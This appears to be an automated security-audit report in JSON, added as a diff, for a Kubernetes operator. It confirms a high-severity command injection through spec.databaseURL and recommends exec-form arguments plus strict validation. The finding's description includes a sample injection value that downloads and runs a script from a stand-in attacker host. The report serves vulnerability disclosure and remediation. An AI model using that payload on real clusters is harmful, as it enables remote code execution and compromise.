@@ -1,0 +1,27 @@
+{
+  "summary": "Verified 2 findings against the operator source. Kept 1 and dropped 1. The command-injection finding (finding 1) is real and high severity: the attacker-controlled WarpgateInstance.spec.databaseURL has no validation (CRD marks it only +optional; the webhook merely emits a warning) and is interpolated inside double quotes into a shell script that runs via `/bin/sh -c` in the init container, allowing arbitrary command execution for anyone who can create or update a WarpgateInstance. The unencoded-search-param finding (finding 2) was dropped: the code facts are accurate but the injection stays inside the URL query component (cannot reach another endpoint or inject headers, since Go's url.Parse rejects CRLF/control chars), and every caller re-validates results with an exact-match check, so it is a robustness/hardening issue with no confirmable security impact.",
+  "coverage": [
+    "internal/controller/warpgateinstance_controller.go",
+    "api/v1alpha1/warpgateinstance_types.go",
+    "api/v1alpha1/warpgateinstance_webhook.go",
+    "internal/warpgate/user.go",
+    "internal/warpgate/role.go",
+    "internal/warpgate/target.go",
+    "internal/warpgate/client.go"
+  ],
+  "findings": [
+    {
+      "title": "OS command injection via WarpgateInstance.spec.databaseURL in generated init-container script",
+      "category": "security",
+      "cwe": "CWE-78",
+      "severity": "high",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 556,
+      "line_end": 558,
+      "description": "buildDeployment assembles a shell script from string fragments and runs it with `Command: []string{\"/bin/sh\", \"-c\", initScript}` (line 776) in the instance's init container. The attacker-controlled field inst.Spec.DatabaseURL is concatenated into that script inside double quotes via fmt.Sprintf(\" --database-url \\\"%s\\\"\", inst.Spec.DatabaseURL). DatabaseURL has no character validation: the CRD type (api/v1alpha1/warpgateinstance_types.go:83-86) only marks it +optional, and the admission webhook (api/v1alpha1/warpgateinstance_webhook.go:256-258) only emits a warning for it. A value such as `sqlite:/data/db\"; wget http://attacker/x -O /tmp/x; sh /tmp/x; echo \"` breaks out of the quotes and executes arbitrary commands as the init container's user (no securityContext is set, so typically root) with the pod's service account. Reachable by anyone who can create or update a WarpgateInstance in a namespace; it is also a way to achieve code execution under an otherwise policy-approved image, bypassing image allow-listing.",
+      "evidence": "setupCmd := fmt.Sprintf(`warpgate --skip-securing-files unattended-setup --data-path /data --http-port %d --admin-password \"${ADMIN_PASSWORD}\"`, instanceHTTPPort(inst))\n...\nif inst.Spec.DatabaseURL != \"\" {\n    setupCmd += fmt.Sprintf(` --database-url \"%s\"`, inst.Spec.DatabaseURL)   // line 557, unsanitized\n}\n...\ninitScript := strings.Join(scriptParts, \"\\n\")   // line 611\n...\nCommand: []string{\"/bin/sh\", \"-c\", initScript}   // line 776 \u2014 executed\n\nData flow: WarpgateInstance.Spec.DatabaseURL (CR, user-controlled; no Pattern validation) -> setupCmd -> scriptParts -> initScript -> /bin/sh -c. The webhook at api/v1alpha1/warpgateinstance_webhook.go:256-258 only appends a warning and never rejects or sanitizes the value. The same unvalidated field is also interpolated into generated YAML at buildWarpgateConfig, and spec.externalHost is interpolated into YAML as well, allowing warpgate.yaml config injection via the same missing-validation root cause.",
+      "recommendation": "Do not build the setup command via shell string interpolation. Pass warpgate's setup as an argv slice (exec form) instead of `sh -c`, or supply DatabaseURL/admin values through environment variables / files that the program reads, so no value is parsed by a shell. If a shell is unavoidable, strictly validate spec.databaseURL and spec.externalHost in the admission webhook (allow-list a known URL/host grammar) and shell-quote any interpolated value. Apply the same validation before writing them into the generated warpgate.yaml."
+    }
+  ]
+}
